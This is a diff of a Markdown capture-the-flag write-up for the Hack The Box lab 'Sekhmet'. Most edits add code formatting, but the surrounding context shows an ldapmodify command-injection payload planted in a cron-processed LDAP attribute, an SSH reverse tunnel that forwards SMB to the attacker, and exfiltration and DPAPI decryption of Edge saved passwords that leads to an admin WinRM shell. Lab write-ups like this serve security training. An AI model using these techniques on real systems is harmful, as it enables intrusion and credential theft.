@@ -304,7 +304,7 @@ Amidst the sea of data is a huge blob for the Ray.Duncan user that contains a ha
 
 ![](../assets/img/2026-05-23-Sekhmet/19.png)
 
-Abusing KSU
+### Abusing KSU
 We can't use this to login via SSH since he is not a user on the Linux machine, however we can request a ticket on the domain from the web server with `kinit`. Also, displaying the `/etc/krb5.conf` file reveals that the DC is named `hope.windcorp.htb`.
 
 ```
@@ -535,7 +535,7 @@ After a couple minutes and re-fetching the same file, Ray's mobile number is alt
 ![](../assets/img/2026-05-23-Sekhmet/27.png)
 
 ### Command Injection
-Knowing that this script is automated, if we update this attribute to contain a payload testing for command injection, it may be possible to execute arbitrary commands via this cronjob. We can use either backticks ``` or wrap our command in `$()` to accomplish this.
+Knowing that this script is automated, if we update this attribute to contain a payload testing for command injection, it may be possible to execute arbitrary commands via this cronjob. We can use either backticks or wrap our command in `$()` to accomplish this.
 
 I'll first just supply a simple whoami command to see if this works at all and who it's running as.
 
@@ -554,7 +554,7 @@ Next I spent some time trying to upload a Netcat binary and reverse shell made w
 └─$ echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(net use \\\\webserver.windcorp.htb\\test 2>&1)' | ldapmodify -H ldap://hope.windcorp.htb
 ```
 
-We'll need to setup another tunnel that will forward all traffic over TCP 445 that reaches the web server, to come to our machine. I'll reestablish an SSH connection and add the -R 0.0.0.0:445:127.0.0.1:445 flag to do so. We should also enable Remote Tunneling in our /etc/ssh/sshd_config file by making sure the GatewayPorts line is uncommented and set to yes. Restarting our SSH service before reconnecting is a good idea to weed out any bugs.
+We'll need to setup another tunnel that will forward all traffic over TCP 445 that reaches the web server, to come to our machine. I'll reestablish an SSH connection and add the `-R 0.0.0.0:445:127.0.0.1:445` flag to do so. We should also enable Remote Tunneling in our `/etc/ssh/sshd_config` file by making sure the GatewayPorts line is uncommented and set to yes. Restarting our SSH service before reconnecting is a good idea to weed out any bugs.
 
 ```
 └─$ sudo service ssh restart
@@ -595,7 +595,7 @@ root@webserver:~# ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB"
 root@webserver:~# awk '{print $2}' usernames.txt > DomainUsers.txt
 ```
 
-Extracting these names by grepping for the _samAccountName_ and getting their values with an awk command gives us a very large list of users (around 600). 
+Extracting these names by grepping for the _samAccountName_ and getting their values with an `awk` command gives us a very large list of users (around 600). 
 
 ![](../assets/img/2026-05-23-Sekhmet/30.png)
 
@@ -622,7 +622,7 @@ First we'll need to grab a TGT as him through proxcychains.
 
 ![](../assets/img/2026-05-23-Sekhmet/32.png)
 
-Now we'll need to update our /etc/hosts file to resolve the DC's Fully Qualified Domain Name of HOPE.WINDCORP.HTB to match its IP address. This is because NTLM auth is disabled and the FQDN is required for Kerberos to work.
+Now we'll need to update our `/etc/hosts` file to resolve the DC's Fully Qualified Domain Name of `HOPE.WINDCORP.HTB` to match its IP address. This is because NTLM auth is disabled and the FQDN is required for Kerberos to work.
 
 ![](../assets/img/2026-05-23-Sekhmet/33.png)
 
@@ -639,7 +639,7 @@ Listing our group memberships and token permissions shows that we are apart of t
 
 ![](../assets/img/2026-05-23-Sekhmet/35.png)
 
-There was also a Script directory at the root of the C:\ drive, but overwriting any of these didn't work to execute them after-the-fact.
+There was also a Script directory at the root of the `C:\` drive, but overwriting any of these didn't work to execute them after-the-fact.
 
 ![](../assets/img/2026-05-23-Sekhmet/36.png)
 
@@ -648,7 +648,7 @@ The only user we didn't have access to on the system was the Administrator, so I
 ![](../assets/img/2026-05-23-Sekhmet/37.png)
 
 ### Decrypting Microsoft Edge Passwords
-A bit of research on where Microsoft Edge stores its credentials and secrets at leads me to the C:\users\Bob.Wood\AppData\Local\Microsoft\edge\User Data\default\ directory, which contains a "Login Data" file.
+A bit of research on where Microsoft Edge stores its credentials and secrets at leads me to the `C:\users\Bob.Wood\AppData\Local\Microsoft\edge\User Data\default\` directory, which contains a "Login Data" file.
 
 ![](../assets/img/2026-05-23-Sekhmet/38.png)
 
@@ -663,7 +663,7 @@ Checking what language mode our user is currently in reveals that we are stuck i
 ConstrainedLanguage
 ```
 
-This feature is designed to allow standard administrative tasks while blocking malicious actors from invoking sensitive, low-level Windows APIs or arbitrary .NET code. The most popular way to escape CLM is to utilize a legitimate tool on Windows called InstallUtil.exe to spawn a shell with an unrestricted language model, but this would take a bit longer.
+This feature is designed to allow standard administrative tasks while blocking malicious actors from invoking sensitive, low-level Windows APIs or arbitrary .NET code. The most popular way to escape CLM is to utilize a legitimate tool on Windows called `InstallUtil.exe` to spawn a shell with an unrestricted language model, but this would take a bit longer.
 
 Instead, I'll opt to exfil the necessary files from the Edge directory and attempt to recover any secrets offline. We'll need the Local State and Login Data files from it, but since we're in CLM, the command to convert them to base64 is blocked. I figure out that we can swap to certutil to encode the data and copy/paste it to our local machine works just fine.
 
@@ -750,7 +750,7 @@ To decrypt the master password, we need to grab its GUID from the blob which can
 
 ![](../assets/img/2026-05-23-Sekhmet/40.png)
 
-Now we'll use the pre-keys to create a file containing the masterkey using the masterkey file which can be found on the machine under the C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1–5–21–1844305427–4058123335–2739572863–2761 directory.
+Now we'll use the pre-keys to create a file containing the masterkey using the masterkey file which can be found on the machine under the `C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1–5–21–1844305427–4058123335–2739572863–2761` directory.
 
 ```
 └─$ pypykatz dpapi masterkey a8bd1009-f2ac-43ca-9266-8e029f503e11.decoded prekeys -o masterkey
@@ -774,7 +774,7 @@ file: ../logindata.decoded user: bob.woodADM@windcorp.com pass: b'[REDACTED]' ur
 ```
 
 ### Admin Shell
-The final entry contains a password for Bob.WoodADM that logs into webmail.windcorp.com , but these credentials are reused for the domain too. We can grab a TGT using this password and grab a shell via WinRM to discover that this user is an Administrator.
+The final entry contains a password for Bob.WoodADM that logs into the site at `webmail.windcorp.com`, but these credentials are reused for the domain too. We can grab a TGT using this password and grab a shell via WinRM to discover that this user is an Administrator.
 
 ![](../assets/img/2026-05-23-Sekhmet/41.png)
 
